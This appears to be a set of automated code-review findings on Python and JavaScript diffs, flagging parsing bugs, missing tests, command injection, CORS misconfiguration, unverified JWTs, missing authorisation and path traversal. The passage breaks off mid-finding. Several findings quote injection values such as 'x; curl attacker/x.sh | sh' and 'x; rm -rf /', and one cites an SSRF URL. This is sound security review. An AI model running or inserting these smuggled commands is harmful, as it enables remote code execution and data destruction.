findings.body: `content_type.split(";")` leaves the leading space that virtually every client emits: `multipart/form-data; boundary=----WebKitFormBoundaryXyz` yields the second field `" boundary=----WebKitFormBoundaryXyz"`. `field.partition("=")` then gives `k == " boundary"`, which fails the `k == "boundary"` comparison, so `_parse_mime_body` is never called, the loop finishes without `break`, and the `for/else` logs "Invalid multipart/form-data" instead. Net effect: all normal multipart uploads lose their form fields and files, silently apart from a warning. Fix by normalising the token, e.g. `k, sep, v = field.strip().partition("=")` (and consider `k.lower()` since parameter names are case-insensitive).

findings.title: No test covers multipart boundary parsing across Content-Type field orderings
findings.body: The change reworks how the boundary is extracted from the Content-Type header (splitting on ';' and matching 'k == "boundary"' after partitioning on '='), specifically to handle boundary not being the last field. No test in this diff exercises multipart bodies where boundary appears first, in the middle, or has surrounding whitespace (e.g. 'multipart/form-data; boundary=X; charset=...' vs 'multipart/form-data; charset=...; boundary=X'). Because k is compared with a strict '==' to "boundary" without stripping whitespace, a header like 'multipart/form-data; boundary=X ; charset=Y' (leading space in the second field's key after split) would silently fail to match and fall through to the warning branch, losing form data instead of raising an error that a test would catch. Since there's no test asserting the parsed boundary value or that _parse_mime_body was invoked with the correct boundary for various header orderings, this exact bug (which reportedly took three days to find) would not be caught by any existing safety net.

findings.title: Unstripped Content-Type parameter breaks boundary match; request still dispatched
findings.body:
`content_type.split(";")` yields parameters with the conventional leading space (`" boundary=----x"`), so `k` is `" boundary"` and never equals `"boundary"`. Quoted values (`boundary="----x"`) are likewise not unquoted. The loop therefore falls through to the `else` branch for well-formed requests: `_parse_mime_body` is never called, `logging.warning("Invalid multipart/form-data")` fires, and `self.request_callback(self._request)` on line 368 still dispatches the request with empty `arguments`/`files`.

The security-relevant part is that an unparseable body is not rejected \u2014 handlers and any middleware that inspects parsed arguments (validation, CSRF-token lookup from the body, audit logging) see a POST with no parameters rather than an error, which is a fail-open shape. Fix by normalising each parameter, e.g. `k, sep, v = field.strip().partition("=")` and stripping quotes from `v` (or use `cgi.parse_header`), and consider treating a missing boundary as a 400 rather than a logged warning.

_Also raised by the correctness agent:_ Quoted boundary value passed through with surrounding quotes

findings.title: Error message has placeholder with no argument
findings.body:
Line 100 raises LocationParseError with a format string containing '%s' but provides no argument. When this exception is raised, the message will either fail to format or appear as literal '%s'. This breaks the documented intent to provide the problematic URL in the error message. Change to: `raise LocationParseError("Failed to parse: %s" % url)`

_Also raised by the security agent:_ LocationParseError message has a %s with no argument

_Also raised by the correctness agent:_ LocationParseError message has an uninterpolated %s placeholder

findings.title: New util.py has zero test coverage for all three functions
findings.body: The diff adds three functions (make_headers, get_host, is_connection_dropped) with no test file in this change. In particular, get_host's error branch (raising LocationParseError when the port isn't numeric, line 100) and its various URL-parsing branches (scheme, path, auth stripping) are exercised nowhere, so a change to the parsing logic — or a defect already present in the error message construction — would not be caught. Likewise make_headers' accept_encoding/basic_auth branches and is_connection_dropped's poll/select paths are untested.

findings.title: Hand-rolled get_host can pick a different host than urlparse
findings.body:
`get_host` only strips a path when a `/` is present; it never accounts for `?` or `#` terminating the authority. For `http://legit.example.com?x=@attacker.example.com` there is no `/`, so `url` stays `legit.example.com?x=@attacker.example.com`, the `@` split on line 94-95 discards everything before the `@`, and the function returns host `attacker.example.com`. `urllib.parse.urlparse` on the same string returns netloc `legit.example.com`.

The practical risk is host-validation bypass/SSRF in callers that validate a user-supplied URL with the stdlib parser (or a regex) and then hand the same string to urllib3, which resolves it with this function. I cannot see the caller chain in this diff or in any retrieved context, so I cannot confirm an exploitable entry point here — the entry point would be whatever application code passes an externally supplied URL into `PoolManager`/`connection_from_url`.

Suggest delegating to `urlparse`/`urlsplit` for the authority, or at minimum truncating `url` at the first `/`, `?` or `#` before the `@` and `:` splits.

findings.title: Public attribute behavior contradicts documentation
findings.body: The `location` attribute now stores a `URL` object, but the documentation in `docs/web_reference.rst` explicitly states it stores "the string it was constructed with". Application code relying on this contract—such as comparing it with `str.startswith()` or using it as a string—will break. The documentation must be updated to reflect this breaking change, or the implementation should be reverted to match the documented behavior.

findings.title: `HTTPMove.location` changes type from str to URL, breaking callers
findings.body:
Previously `self.location` was assigned the raw `location` argument (a string in the documented usage); now it is assigned `URL(location)`. The documented contract states `location` is "the string it was constructed with" and that application code compares it against configured strings and calls `str.startswith` on it. A `yarl.URL` has no `startswith`, so such callers will raise `AttributeError`, and `response.location == "/login"` comparisons will silently become `False`. `URL()` also normalises/encodes the input, so even `str(resp.location)` may not round-trip the original string.

If the intent was only to avoid constructing the URL twice, keep the public attribute as the original value, e.g. build a local `url = URL(location)`, set `self.headers['Location'] = str(url)`, and leave `self.location = location`. If the type change is intentional it needs a deprecation path and a docs update.

Note the header value itself is unaffected: `str(URL(location))` is what was written before.

findings.title: No test guards self.location's type/value against this regression
findings.body: self.location is now assigned URL(location) instead of the original string, contradicting the documented contract that HTTPMove.location is 'the string it was constructed with' for use with str.startswith and string comparisons. This diff includes no test asserting isinstance(self.location, str) or self.location == original string; if this change is wrong, no existing test suite entry shown would fail.

findings.title: location attribute type change can silently defeat redirect allowlist checks
findings.body:
`self.location` changes from the caller-supplied `str` to a `yarl.URL`. The documented contract (docs/web_reference.rst) is that application code compares this attribute against configured strings and calls `str.startswith` on it. After this change:

- `exc.location.startswith('/')`-style checks raise `AttributeError` (yarl.URL has no `startswith`), and any handler that swallows exceptions around the check loses the guard entirely;
- `exc.location == "/dashboard"` or `exc.location in ALLOWED_TARGETS` silently evaluates `False`, because a `URL` never equals a `str`.

Where such a comparison is an allowlist for a redirect target derived from user input (the common `?next=` / `?redirect_to=` pattern that reaches `HTTPFound(location=...)`), the check no longer does what it was written to do. The `Location` header itself is unaffected — line 9 still emits `str(URL(location))`, identical to the previous behaviour — so the exposure is entirely in downstream consumers of the attribute.

If the URL object is desired, expose it under a new name (e.g. `location_url`) and keep `location` as the string, or make this an explicitly documented breaking change so callers can audit their comparisons.

I cannot see the application-side entry point in this diff or in the retrieved context, so I am reasoning from the documented usage rather than an observed call site; confidence is set accordingly.

findings.title: readany can return empty bytes before EOF after the while→if change
findings.body:
`_wait()` resolves the waiter not only on `feed_data()`/`feed_eof()` but also at the end of a chunk, which its own docstring states can happen with no new data in the buffer: "a caller must re-check its condition after waking rather than assuming data arrived." With the loop replaced by a single `if`, control falls straight through to `self._read_nowait(-1)` after one spurious wake, and `_read_nowait` on an empty buffer with `_eof` still false returns an empty result. Callers of `readany()` conventionally treat an empty return as end-of-stream, so a consumer loop (`while True: chunk = await resp.content.readany(); if not chunk: break`) will silently truncate the body. Restore the `while` so the buffer/EOF condition is re-checked after each wake.

_Also raised by the security agent:_ Single `if` around `_wait` can return empty body early (truncation)

findings.title: No test guards against spurious-wakeup regression in read()
findings.body: The change replaces `while not self._buffer and not self._eof` with `if not self._buffer and not self._eof`, undoing a fix for the case where `_wait` resolves without new data (per the docstring: 'the waiter is also resolved at the end of a chunk, which can happen with no new data in the buffer'). With `if`, a single spurious wakeup will cause `read()` to return empty data prematurely instead of re-checking and waiting again. No test in the diff (or referenced) exercises a spurious wakeup / empty-buffer-after-wait scenario, so this regression would not be caught by CI.

findings.title: Implicit relative import of `adapters` breaks module loading
findings.body: `from adapters import HTTPAdapter` is an implicit relative import. Implicit relative imports were removed in Python 3 (PEP 328), so importing `requests.sessions` will raise `ModuleNotFoundError: No module named 'adapters'` unless a top-level `adapters` package happens to exist on `sys.path` — in which case the wrong module is imported. Since `requests.sessions` is imported during package initialisation, this makes the whole library unimportable. Restore `from .adapters import HTTPAdapter`, matching line 6.

findings.title: Implicit import lets a sys.path module shadow requests' adapters
findings.body: `from .adapters import HTTPAdapter` binds unambiguously to the module inside the `requests` package. `from adapters import HTTPAdapter` resolves through `sys.path` instead, so any `adapters.py` (or `adapters/` package) earlier on the path — notably `sys.path[0]`, which is the invoking script's directory, and on some invocations the current working directory — is imported and executed instead of the library's own module. Anyone who can drop a file into a directory the interpreter searches (a shared deploy dir, a world-writable app root, a user's cwd for a CLI that uses requests) gets arbitrary code execution inside the importing process, and controls the `HTTPAdapter` that subsequently performs every TLS connection and certificate check. Restore the explicit relative form `from .adapters import HTTPAdapter`.

findings.title: get_cookie raises TypeError when request.cookies is None
findings.body: `HTTPRequest.cookies` is documented (and implemented) to return `None` when a Cookie header is present but unparseable. With the guard removed, `name in self.request.cookies` evaluates `name in None`, which raises `TypeError: argument of type 'NoneType' is not iterable`. Any request carrying a malformed Cookie header that reaches a handler calling `get_cookie` (including framework-internal callers such as XSRF/secure-cookie handling) will now fail with a 500 instead of falling back to `default`. Restore the check: `if self.request.cookies is not None and name in self.request.cookies:` — or make the property return an empty dict, but that is a wider contract change affecting every consumer.

findings.title: Malformed Cookie header causes TypeError in get_cookie (remote DoS)
findings.body: `RequestHandler.get_cookie` now does `name in self.request.cookies` with no `None` check. Per `tornado/httpserver.py`, the `cookies` property deliberately returns `None` when the `Cookie` header is present but unparseable, and the docstring states "every consumer has to allow for that". An unauthenticated remote client fully controls the `Cookie` request header, so sending a malformed value makes this line evaluate `name in None`, raising `TypeError` and producing a 500 on every handler that reads a cookie \u2014 including XSRF/session code paths that call `get_cookie` early in request processing. Restore the guard: `if self.request.cookies is not None and name in self.request.cookies:` (or have `cookies` return an empty dict).

findings.title: get_cookie docstring does not document potential crash
findings.body: The docstring states 'Gets the value of the cookie with the given name, else default.' This promises safe fallback behaviour, but line 3 will crash with TypeError if request.cookies is None. According to httpserver.py, cookies can be None when the Cookie header is present but unparseable. The docstring must either (a) document this exception, or (b) the None check must be restored.

findings.title: No test exercises get_cookie with a malformed Cookie header
findings.body: The removed None-guard was added specifically to handle the case where request.cookies is None (malformed Cookie header, per httpserver.py's cookies property docstring). This diff reintroduces a TypeError in that case (`name in None`), and nothing in the visible test suite calls get_cookie with request.cookies set to None to catch this regression.

findings.title: Dropping .strip() breaks boundary detection for multipart bodies
findings.body: `content_type.split(";")` yields parameter segments that, per RFC 7231 / normal client behaviour, carry leading whitespace after the semicolon — e.g. `multipart/form-data; boundary=----WebKitFormBoundaryabc` splits into `['multipart/form-data', ' boundary=----WebKitFormBoundaryabc']`. Without `.strip()`, `field.partition("=")` produces `k == " boundary"`, so the `k == "boundary"` test on line 5 never matches, `_parse_mime_body` is never called, and the request's form fields and files are silently empty — no exception, no log, just missing data for every handler that reads `self.request.arguments`/`files`. Restore `field.strip().partition("=")` (and ideally keep stripping the value too, since quoted/padded boundary values are common).

findings.title: Un-stripped Content-Type params make multipart bodies silently unparsed
findings.body: Entry point is the client-supplied `Content-Type` request header; the sink is `self._parse_mime_body(v, data)` on line 6. After splitting on `;`, real-world headers look like `multipart/form-data; boundary=abc`, so the second field is `" boundary=abc"`. Without `.strip()`, `k` is `" boundary"`, the `k == "boundary"` test on line 5 fails, and the multipart body is never parsed — no fields, no files, no error. Beyond the functional regression, this creates a parsing disagreement: an upstream proxy, WAF or logging tier that parses the header per RFC 9110 (optional whitespace around parameters) sees and inspects the multipart body, while the application silently discards it, or vice versa. Any request-body-based validation or audit logic downstream of this parse becomes unreliable. Restore `field.strip().partition("=")` (and consider stripping/unquoting `v` as well, since a trailing CR or quotes would otherwise be passed straight into the boundary matcher).

findings.title: No test guards multipart boundary parsing against whitespace regression
findings.body: The diff removes `.strip()` when splitting content-type parameters, so a header like `multipart/form-data; boundary=xyz` (with a space after `;`) will produce `k == " boundary"` instead of `"boundary"`, causing the boundary match to fail and the multipart body to silently not be parsed. No test file is part of this change, so nothing would fail if this regression is real. Add a test that sends a multipart request with a space after the `;` separator (the common, spec-typical form) and asserts the fields are actually parsed.

findings.title: No test verifies the LocationParseError message content
findings.body: The change removes the '% url' interpolation from the error message, so the raised message becomes the literal string 'Failed to parse: %s' instead of including the offending url. No test in this diff asserts on the exception message text, so this regression (or any future regression to this string) would not be caught by the test suite as shown.

findings.title: Format placeholder left without its argument in LocationParseError
findings.body: `"Failed to parse: %s"` is now raised as a literal string — the `% url` interpolation was removed, so the exception message contains a bare `%s` instead of the URL that failed to parse. Callers or logs that surface this message lose the only diagnostic detail it carried, and any test asserting the message contains the URL will fail. Restore the argument: `raise LocationParseError("Failed to parse: %s" % url)`.

findings.title: Command injection via shell=True with interpolated name/directory
findings.body:
`create_archive` formats `name` and `directory` directly into a shell string and executes it with `shell=True`. Any shell metacharacter in either argument escapes the intended `tar` invocation: `name = "x; curl attacker/x.sh | sh"` or `directory = "$(id)"` runs arbitrary commands as the service user.

Fix by dropping the shell entirely and passing an argument list, as the neighbouring `list_exports` already does:

```python
output = os.path.join("/exports", f"{name}.tar.gz")
subprocess.run(["tar", "-czf", output, directory], check=True)
```

Even with the list form, `name` still needs validation (e.g. reject `/` and `..`, or allowlist `[A-Za-z0-9_-]+`), because `f"/exports/{name}.tar.gz"` lets a caller write the archive outside `/exports` via path traversal.

findings.title: Unquoted interpolation into shell command breaks on spaces/metacharacters
findings.body:
`cmd` is built by f-string interpolation and executed with `shell=True`, so the shell re-splits the string on whitespace and expands metacharacters. A perfectly ordinary input like `name="Q1 report"` produces `tar -czf /exports/Q1 report.tar.gz <dir>`, which tar reads as two operands and either fails or writes the wrong file; a `directory` containing a space or a glob character has the same problem. Beyond the obvious injection exposure (`name="x; rm -rf /"` executes), this is a plain correctness bug for legitimate inputs.

Use the argument-list form, matching `list_exports` on line 5:

```python
return subprocess.run(
    ["tar", "-czf", f"/exports/{name}.tar.gz", directory],
    capture_output=True, check=True,
)
```

and validate `name` against a safe pattern (no `/`, no `..`) so it cannot escape `/exports/`.

findings.title: create_archive has no test coverage at all
findings.body: The new create_archive function builds a shell command by string interpolation and executes it with shell=True. No test file is included in this diff, and there's no existing test for list_exports either, so this is new, untested behavior. A test exercising normal names, and names with special characters/spaces, would catch both logic regressions and would have surfaced the injection risk earlier.

findings.title: Public function lacks contract documentation
findings.body: The `create_archive` function is exported and callable, but has no docstring explaining its parameters, return value, or constraints. A caller cannot determine from the signature alone what `name` and `directory` should contain or what the function returns. This is particularly important for any input validation expectations.

findings.title: Wildcard CORS origin combined with credentials on dashboardCors
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. This removes the origin allowlist that the sibling middleware on lines 6–7 applies (`origin: ALLOWED`), so any route mounted with `dashboardCors` will accept cross-origin requests from arbitrary sites.

Entry point: the `Origin` header of any cross-site request from a page an authenticated user visits. Sink: the `Access-Control-Allow-Origin` / `Access-Control-Allow-Credentials` response headers emitted by this middleware, which govern whether the browser lets the attacker's script read the response of a cookie-authenticated request.

Note on the exact mechanics: if the middleware emits the literal `*` alongside `Access-Control-Allow-Credentials: true`, browsers reject the pair and credentialed reads fail — but the configuration is still wrong, and many CORS layers (or a fronting proxy/gateway that normalises the wildcard by reflecting the request origin) turn this into a working cross-origin credentialed read of dashboard data. Either way the allowlist is switched off.

Fix: reuse `ALLOWED` (or a dashboard-specific allowlist of exact origins) rather than `"*"`. If the dashboard endpoints genuinely need to be public, drop `credentials: true` and serve them without cookie/session auth.

findings.title: origin:"*" with credentials:true is rejected by browsers
findings.body:
`cors({ origin: "*", credentials: true })` emits the literal header `Access-Control-Allow-Origin: *` together with `Access-Control-Allow-Credentials: true`. Per the Fetch/CORS spec a wildcard ACAO is invalid for requests made with `credentials: "include"`, so the browser blocks the response and the dashboard's authenticated calls fail — the opposite of what this config intends. (It is also an origin-authentication control effectively switched off for any non-credentialed path.)

Fix by reflecting a validated origin instead of a wildcard, e.g. reuse the `ALLOWED` list used on line 6, or pass an origin callback that echoes the request origin only when it matches the dashboard's host. Keep `credentials: true` only alongside a concrete origin value.

findings.title: Live payment API key hardcoded, replacing env-var lookup
findings.body:
`ACMEPAY_SECRET_KEY = "acme_live_..."` is a production-shaped payment provider secret (`acme_live_` prefix, 32 hex chars) committed to the repository, and line 8 now assigns it directly to `acmepay.api_key` in place of the previous `os.environ["ACMEPAY_SECRET_KEY"]` read (the `import os` was dropped along with it).

Anyone with read access to the repo — plus anyone who later gets a clone, a CI log, a container image layer, or a fork — obtains the ability to make live payment API calls. Git history makes this irreversible by revert alone.

Actions: (1) treat the key as compromised and rotate it at AcmePay now; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or a secrets-manager fetch) and re-add `import os`; (3) purge the literal from git history, or at minimum confirm rotation before the branch is shared further.

findings.title: Env-based key selection removed; all environments now use one live key
findings.body: Previously `client()` read `os.environ["ACMEPAY_SECRET_KEY"]` on each call, so staging, CI and local runs could supply their own key and a missing key failed loudly at call time. After this change the key is a module-level constant with an `acme_live_` prefix, so every environment — including tests and CI — authenticates against the live payments account, and there is no longer any way to override it without editing source. Restore the environment lookup (optionally with an explicit default or a clear startup error) so non-production environments keep using non-production credentials.

findings.title: No test exercises client() or asserts on acmepay.api_key
findings.body: The diff changes client() to source its key from a new module-level constant instead of os.environ, but no test in this PR calls client() and asserts that acmepay.api_key equals ACMEPAY_SECRET_KEY (or the fixture's TEST_KEY). Only a fixture (tests/fixtures/acmepay.py) was added, which is test infrastructure, not a test. If client() were changed to set the wrong value, or to not set it at all, nothing here would fail.

findings.title: tenant_of returns an unverified, unexpired tenant_id claim
findings.body:
`tenant_of` calls `jwt.decode(..., options={"verify_signature": False})`, so the returned `tenant_id` is whatever the bearer put in the payload — no signature check, and with signature verification off PyJWT also skips `exp`/`nbf`/`aud` validation. Any caller using this value to scope data access will accept a self-minted or expired token and read another tenant's data. The module already has the correct pattern one function above: derive the tenant from `claims_for(token)` (which verifies against `public_key()`), or if a key lookup genuinely needs the tenant first, decode unverified only to select the key and then re-decode with verification before returning anything to callers.

_Also raised by the security agent:_ tenant_id read from JWT with signature verification disabled

findings.title: Public function `tenant_of` lacks contract documentation
findings.body: The function `tenant_of` is a public API that accepts a token and deliberately disables JWT signature verification (line 11: `options={"verify_signature": False}`). Without documentation, callers cannot understand the critical preconditions: whether the token must be pre-verified, whether this function is safe to call on untrusted input, and why signature verification is skipped. A caller could incorrectly assume the token has been validated, or attempt to use this on hostile input.

findings.title: New tenant_of() function has no test coverage
findings.body: tenant_of() introduces a new code path that decodes a JWT with signature verification disabled and trusts the tenant_id claim. There is no test file in this diff, so nothing would catch a regression such as a malformed token crashing the function, a missing 'tenant_id' key raising an unhandled KeyError, or a future change that silently re-enables/disables verification incorrectly. Add a test that exercises tenant_of with a valid unverified token, a tampered token, and a token missing the tenant_id claim.

findings.title: KeyError on tokens without a tenant_id claim
findings.body: `unverified["tenant_id"]` raises `KeyError` for any well-formed token that simply lacks the claim, and `jwt.decode` raises `DecodeError` for a malformed token — neither is handled, so callers get an exception type unrelated to authentication and will likely surface a 500 instead of a 401/400. Use `unverified.get("tenant_id")` with an explicit check, or raise the module's own auth error.

findings.title: Missing ownership check lets any user edit any payment method
findings.body:
`update_payment_method` resolves `pm_id` (attacker-controlled, it comes straight from the request routing as in the read handler above) via `PaymentMethod.get(pm_id)` and then writes `body["billing_name"]` and calls `pm.save()` without ever authorising the caller against that object. `current_user(request)` is called on line 11 and the result is assigned to `user` but never used — authentication is performed, authorisation is not. The docstring in `api/auth.py` is explicit: "Every object mutation must call this" (`require_owner`), and the read handler on line 6 does exactly that.

Any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on another user's stored payment method.

Fix: add `require_owner(user, pm)` immediately after the `PaymentMethod.get(pm_id)` on line 12, before any field assignment or `save()`.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ body["billing_name"] raises KeyError on a request missing the field

findings.title: No test would catch missing ownership check on update path
findings.body: update_payment_method loads a PaymentMethod by id and mutates/saves it without calling require_owner (unlike the adjacent get handler at line 6). There is no test in this diff exercising this function, so a test asserting that a non-owner cannot update another user's payment method — which would fail against this code — does not exist. Since the sibling read endpoint has this exact check and is presumably tested/verified for it, the omission here is exactly the kind of behavior change that should have a corresponding authorization test but doesn't.

findings.title: Rate limit removed from password reset endpoint
findings.body: `request_reset` was previously throttled to 5 requests/hour via `@rate_limit("5/hour")`; the decorator and its import are deleted, so the handler now accepts unbounded calls. An unauthenticated caller who can reach this endpoint can supply an arbitrary `email` and drive `send_reset_email(email)` as fast as the server will accept requests. Practical consequences: mail-bombing an arbitrary victim address, burning the outbound mail quota / provider reputation, cheaply enumerating registered accounts if the response or timing differs, and — if reset tokens are short-lived or low-entropy — vastly more attempts per unit time against the token space. If the throttle was intentionally moved to middleware, a gateway, or the mail layer, that replacement is not visible here; otherwise restore the decorator and consider limiting per source IP *and* per target email so one attacker cannot rotate IPs to spam a single victim.

findings.title: request_reset no longer throttled; unbounded reset-email sending
findings.body: The `@rate_limit("5/hour")` decorator and the `from limits import rate_limit` import were deleted, leaving `request_reset` with no throttle at all. Each call unconditionally invokes `send_reset_email(email)` and returns `{"sent": True}`, so an unauthenticated caller can drive an arbitrary number of outbound emails for any address — enabling mailbox flooding of a victim, enumeration probing, and exhaustion of the mail provider's quota (which then breaks resets for legitimate users). Nothing else in the function bounds the call, and there is no error handling around `send_reset_email`, so failures from a throttled provider will surface as unhandled exceptions rather than a degraded-but-correct response. Restore the decorator, or move the limit into whatever middleware now owns it and reference that explicitly.

findings.title: No test guards rate-limiting on password reset endpoint
findings.body: The `@rate_limit("5/hour")` decorator was removed from `request_reset`, which changes the endpoint's throttling behavior for a sensitive, abuse-prone operation (password reset emails). No test file is present in this diff, so if a test previously asserted that repeated calls to `request_reset` were throttled, it is not shown here, and if no such test exists, this regression would go undetected by CI. Since this makes brute-force/spam attacks on the reset flow cheaper, a test asserting that exceeding the rate limit raises/blocks further requests would have caught this change.

findings.title: read_export_preview bypasses _confined, allowing reads outside EXPORT_ROOT
findings.body:
The existing reader resolves its target through `_confined(name)` (line 14), which is evidently the helper that normalises the name and asserts it stays under `EXPORT_ROOT`. `read_export_preview` instead does `os.path.join(EXPORT_ROOT, name)` directly. Two concrete consequences for reachable inputs: a `name` containing `../` segments resolves to a path above `EXPORT_ROOT`, and an absolute `name` (e.g. `/etc/passwd`) makes `os.path.join` discard `EXPORT_ROOT` entirely and return the absolute path. Either way the function opens and returns up to `limit` bytes of an arbitrary file. Replace line 20 with `path = _confined(name)` so both readers share the same confinement.

_Also raised by the security agent:_ read_export_preview skips _confined(), allowing path traversal

findings.title: Public function lacks documentation of path-safety contract
findings.body: The new `read_export_preview()` function is a public API (mirroring the pattern of `read_export()` above it) but has no docstring explaining its behavior or constraints. The function name does not convey that it accepts a raw `name` parameter that is directly joined to `EXPORT_ROOT` without path normalization or confinement checks. Callers unfamiliar with the difference between this function and `read_export()` could assume it is equally safe, but it is not. Add a docstring that explicitly documents whether `name` is validated, confined, or normalized—or whether the caller is responsible for validating it.

findings.title: New unconfined path handler has no test coverage
findings.body: read_export_preview builds a path via os.path.join(EXPORT_ROOT, name) without the _confined() normalization used by the neighboring handler (line 14). No test exercises this function, so nothing would catch either a path-traversal regression or a future refactor that silently drops confinement.

findings.title: bulk_export no longer enforces tenant ownership on returned reports
findings.body:
`require_owner` was the only tenant-isolation gate in this path and both the import and the loop calling it were removed. `Report.get(rid)` is an id lookup with no tenant predicate, so `bulk_export` now serialises and returns any report for any id supplied in `report_ids` — a caller in tenant A can read tenant B's reports by enumerating or guessing ids. The docstring of `require_owner` states explicitly that every read of another tenant's data must go through it.

If the loop is genuinely a performance problem, keep the control and make it cheap: fetch with a tenant filter in the query (e.g. `Report.get_many(report_ids, tenant_id=user.tenant_id)`) so the database does the isolation in one round trip, rather than dropping the check. Whatever the fix, `user` is now computed on line 5 and never used, which is itself the signal that the authorisation step is gone.

_Also raised by the security agent:_ Ownership check removed from bulk_export enables cross-tenant reads

_Also raised by the docs agent:_ Public endpoint lacks documented authorization contract

findings.title: No test guards bulk_export against cross-tenant access
findings.body: The diff removes the require_owner authorization check from bulk_export. There is no test in this change (or apparently in the existing suite, since none is touched here) that calls bulk_export with report_ids belonging to another tenant and asserts a Forbidden error. Such a test would have failed on this change and caught the regression immediately; without it, nothing in the test suite would detect this authorization bypass.

findings.title: SQL injection via f-string interpolation in search_customers
findings.body:
`search_customers` interpolates `term` and `status` straight into the SQL string with an f-string and then calls `execute(sql)` with no `params`.
